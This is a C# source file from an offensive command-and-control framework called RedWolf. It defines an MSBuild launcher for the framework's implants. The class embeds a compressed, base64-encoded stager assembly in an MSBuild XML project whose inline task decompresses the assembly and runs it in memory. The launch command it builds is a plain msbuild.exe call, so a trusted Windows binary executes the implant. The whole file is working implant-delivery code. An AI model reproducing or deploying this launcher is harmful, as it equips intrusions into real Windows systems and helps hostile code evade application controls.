// Author: Ryan Cobb (@cobbr_io)
// Project: RedWolf (https://github.com/cobbr/RedWolf)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using RedWolf.Models.Grawls;
using RedWolf.Models.Listeners;

namespace RedWolf.Models.Launchers
{
    public class MSBuildLauncher : DiskLauncher
    {
        public string TargetName { get; set; } = "TargetName";
        public string TaskName { get; set; } = "TaskName";

        public MSBuildLauncher()
        {
            this.Name = "MSBuild";
            this.Type = LauncherType.MSBuild;
            this.Description = "Uses msbuild.exe to launch a Grawl using an in-line task.";
            this.OutputKind = OutputKind.WindowsApplication;
            this.CompressStager = true;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grawl grawl, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
            this.DiskCode = XMLTemplate.Replace("{{GRAWL_IL_BYTE_STRING}}", this.Base64ILByteString);
            this.DiskCode = DiskCode.Replace("{{TARGET_NAME}}", this.TargetName);
            this.DiskCode = DiskCode.Replace("{{TASK_NAME}}", this.TaskName);

            string launcher = "msbuild.exe" + " " + template.Name + ".xml";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                string launcher = "msbuild.exe" + " " + hostedFile.Path.Split('/').Last();
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }

        private static string XMLTemplate =
@"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Target Name=""{{TARGET_NAME}}"">
    <{{TASK_NAME}}>
    </{{TASK_NAME}}>
  </Target>
  <UsingTask TaskName=""{{TASK_NAME}}"" TaskFactory=""CodeTaskFactory"" AssemblyFile=""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
    <ParameterGroup/>
    <Task>
      <Code Type=""Fragment"" Language=""cs"">
        <![CDATA[
            var oms = new System.IO.MemoryStream();
            var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRAWL_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
            var by = new byte[1024];
            var r = ds.Read(by, 0, 1024);
            while (r > 0)
            {
                oms.Write(by, 0, r);
                r = ds.Read(by, 0, 1024);
            }
            System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[]{ } });
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>";
    }
}
